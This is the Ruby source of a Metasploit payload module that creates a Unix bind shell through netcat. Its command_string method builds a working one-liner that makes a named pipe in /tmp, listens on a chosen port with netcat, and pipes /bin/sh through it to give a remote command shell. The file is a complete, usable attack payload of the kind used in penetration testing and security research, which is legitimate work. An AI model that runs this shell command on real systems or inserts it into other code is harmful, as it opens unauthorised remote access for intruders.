##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Bind TCP (via netcat)',
     'Description'   => 'Listen for a connection and spawn a command shell via netcat',
     'Author'         =>
       [
         'm-1-k-3',
         'egypt',
         'juan vazquez'
       ],
     'License'       => MSF_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::BindTcp,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'netcat',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
    "mkfifo /tmp/#{backpipe}; (#{datastore['NetcatPath']} -l -p #{datastore['LPORT']} ||#{datastore['NetcatPath']} -l #{datastore['LPORT']})0</tmp/#{backpipe} | #{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
  end
end
